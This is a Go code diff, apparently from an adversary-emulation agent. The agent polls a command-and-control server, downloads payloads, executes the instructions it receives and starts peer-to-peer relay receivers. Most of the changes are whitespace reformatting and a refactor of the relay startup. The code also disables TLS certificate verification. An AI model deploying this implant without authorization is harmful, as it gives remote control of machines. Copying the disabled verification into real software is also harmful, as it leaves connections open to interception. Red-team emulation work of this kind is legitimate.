@@ -26,18 +26,18 @@ import (
 
 // Will download each individual payload listed, and will return the full file paths of each downloaded payload.
 func downloadPayloads(payloadListStr string, coms contact.Contact, profile map[string]interface{}) []string {
-    var droppedPayloads []string
-    payloads := strings.Split(strings.Replace(payloadListStr, " ", "", -1), ",")
-    for _, payload := range payloads {
-        if len(payload) > 0 {
-            location := filepath.Join(payload)
-            if util.Exists(location) == false {
-                location, _ = coms.GetPayloadBytes(payload, profile["server"].(string), profile["paw"].(string),profile["platform"].(string), true)
-            }
-            droppedPayloads = append(droppedPayloads, location)
-        }
-    }
-    return droppedPayloads
+	var droppedPayloads []string
+	payloads := strings.Split(strings.Replace(payloadListStr, " ", "", -1), ",")
+	for _, payload := range payloads {
+		if len(payload) > 0 {
+			location := filepath.Join(payload)
+			if util.Exists(location) == false {
+				location, _ = coms.GetPayloadBytes(payload, profile["server"].(string), profile["paw"].(string),profile["platform"].(string), true)
+			}
+			droppedPayloads = append(droppedPayloads, location)
+		}
+	}
+	return droppedPayloads
 }
 
 func runAgent(coms contact.Contact, profile map[string]interface{}) {
@@ -55,7 +55,7 @@ func runAgent(coms contact.Contact, profile map[string]interface{}) {
 				cmd := cmds.Index(i).Elem().String()
 				command := util.Unpack([]byte(cmd))
 				output.VerbosePrint(fmt.Sprintf("[*] Running instruction %s", command["id"]))
-                droppedPayloads := downloadPayloads(command["payload"].(string), coms, profile)
+				droppedPayloads := downloadPayloads(command["payload"].(string), coms, profile)
 				go coms.RunInstruction(command, profile, droppedPayloads)
 				util.Sleep(command["sleep"].(float64))
 			}
@@ -129,7 +129,7 @@ func validP2pReceiverConfiguration(receiver proxy.P2pReceiver, p2pReceiverConfig
 }
 
 //Core is the main function as wrapped by sandcat.go
-func Core(server string, group string, delay int, executors []string, c2 map[string]string, p2pReceiverConfig map[string]string, verbose bool) {
+func Core(server string, group string, delay int, executors []string, c2 map[string]string, p2pReceiversOn bool, verbose bool) {
 	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
 	privilege := privdetect.Privlevel()
 	output.SetVerbose(verbose)
@@ -148,17 +148,16 @@ func Core(server string, group string, delay int, executors []string, c2 map[str
 	for {
 		coms := chooseCommunicationChannel(profile, c2)
 		if coms != nil {
-		    // Set up and start p2p receiver if specified, for p2p forwarding.
-		    p2pReceiver := chooseP2pReceiverChannel(p2pReceiverConfig)
-
-		    if p2pReceiver != nil {
-		        output.VerbosePrint(fmt.Sprintf("Starting p2p receiver type %s at %s", p2pReceiverType, p2pReceiverLoc))
-
-		        // This method calls a go subroutine before returning.
-		        p2pReceiver.StartReceiver(profile, p2pReceiverConfig, coms)
-		    }
-
-		    // Run agent
+			if p2pReceiversOn {
+				// If any p2p receivers are available, start them.
+				for receiverName, p2pReceiver := range proxy.P2pReceiverChannels {
+					if p2pReceiver != nil {
+						go p2pReceiver.StartReceiver(profile, coms)
+					} else {
+						output.VerbosePrint(fmt.Sprintf("[-] P2P Receiver for %s not found. Skipping.", receiverName))
+					}
+				}
+			}
 			for {
 				runAgent(coms, profile)
 			}
